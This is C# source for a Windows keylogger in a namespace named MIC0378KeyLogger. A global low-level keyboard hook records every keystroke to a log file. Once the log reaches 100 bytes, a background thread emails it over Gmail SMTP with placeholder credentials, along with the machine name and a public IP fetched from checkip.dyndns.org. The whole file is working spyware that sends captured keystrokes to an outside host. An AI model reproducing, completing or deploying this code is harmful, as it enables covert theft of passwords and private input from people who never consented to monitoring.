using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MIC0378KeyLogger
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        private static string logFileName = Application.StartupPath + @"\log.txt";
        private static string archiveFileName = Application.StartupPath + @"\log_archive.txt";
        private static string emailAddress = "email";
        [STAThread]
        static void Main()
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                StreamWriter sw = new StreamWriter(logFileName, true);
                sw.Write((Keys)vkCode);
                sw.Close();

                FileInfo logFile = new FileInfo(logFileName);
                if (logFile.Exists && logFile.Length >= 100)
                {
                    try
                    {
                        logFile.CopyTo(archiveFileName, true);
                        logFile.Delete();

                        System.Threading.Thread mailThread = new System.Threading.Thread(Program.SendEmail);
                        mailThread.Start();
                    }
                    catch (Exception e)
                    {
                        Console.Out.WriteLine(e.Message);
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static void SendEmail()
        {
            try
            {
                string IPAddress = GetIpAddress();
                Debug.WriteLine(IPAddress);
                using (var smtpClient = new SmtpClient("smtp.gmail.com", 587))
                {
                    smtpClient.UseDefaultCredentials = false;
                    smtpClient.Credentials = new NetworkCredential()
                    {
                        UserName = emailAddress,
                        Password = "heslo",
                    };
                    smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
                    smtpClient.EnableSsl = true;

                    MailMessage mail = new MailMessage();
                    mail.From = new MailAddress(emailAddress);
                    mail.To.Add(emailAddress);
                    mail.Subject = "[" + DateTime.Now + "]" + " Key log";
                    mail.Body = "Time: " + DateTime.Now + "\nMachine name: " + Environment.MachineName.ToString() + "\nMachine IP: " + IPAddress;
                    Attachment attachment;
                    attachment = new Attachment(archiveFileName);
                    mail.Attachments.Add(attachment);
                    smtpClient.Send(mail);
                    Debug.WriteLine("Email sent");
                }
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

        public static string GetIpAddress()
        {
            string url = "http://checkip.dyndns.org";
            WebRequest req = WebRequest.Create(url);
            WebResponse resp = req.GetResponse();
            StreamReader sr = new StreamReader(resp.GetResponseStream());
            string response = sr.ReadToEnd().Trim();
            string[] ipAddressWithText = response.Split(':');
            string ipAddressWithHTMLEnd = ipAddressWithText[1].Substring(1);
            string[] ipAddress = ipAddressWithHTMLEnd.Split('<');
            string mainIP = ipAddress[0];
            Debug.WriteLine(mainIP + Environment.MachineName.ToString());
            return mainIP;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
